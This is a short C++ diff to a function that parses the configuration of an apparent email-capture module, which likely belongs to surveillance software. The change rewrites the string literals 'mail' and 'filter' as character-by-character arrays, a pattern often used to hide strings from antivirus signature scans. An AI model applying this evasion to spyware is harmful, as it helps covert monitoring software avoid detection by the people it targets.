@@ -77,16 +77,18 @@ DWORD __stdcall PM_MailCapInit(JSONObject elem)
 {
 	JSONObject mail, filter;
 	FILETIME ftime;
+	WCHAR mail_tag[] = { 'm', 'a', 'i', 'l', 0 };
+	WCHAR filter_tag[] = { 'f', 'i', 'l', 't', 'e', 'r', 0 };
 
-	if (!elem[L"mail"]->IsObject())
+	if (!elem[mail_tag]->IsObject())
 		return 1;
 
-	mail = elem[L"mail"]->AsObject();
+	mail = elem[mail_tag]->AsObject();
 
-	if (!mail[L"filter"]->IsObject())
+	if (!mail[filter_tag]->IsObject())
 		return 1;
 
-	filter = mail[L"filter"]->AsObject();
+	filter = mail[filter_tag]->AsObject();
 	g_mail_filter.max_size = (DWORD) filter[L"maxsize"]->AsNumber();
 	g_mail_filter.search_string[0] = L'*';
 	g_mail_filter.search_string[1] = 0;
